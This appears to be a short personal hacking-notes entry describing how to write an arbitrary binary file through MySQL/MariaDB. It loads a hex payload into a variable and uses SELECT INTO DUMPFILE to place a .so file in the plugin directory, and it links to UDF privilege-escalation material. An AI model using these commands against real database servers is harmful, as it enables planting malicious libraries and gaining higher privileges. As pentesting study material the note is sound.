# mysql mariadb write any binary file with file permissions
`set @shell=0x <hex here> ;`
paste in hex as a variable with no quotes.
prepare payload as plain hex with no newlines with ~/kb/bash-scripting/string-to-hex.sh
```SQL
select @@plugin_dir;
select binary @shell into dumpfile '/path/to/file/file.so';
```
additional UDF exploit info: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library

# Related
- [20221003151236](/zet/20221003151236/README.md) mysql mariadb
- ~/kb/hacking/tricks/mysql-tricks.md

Tags:
    #assorted #hacking #trick #mysql
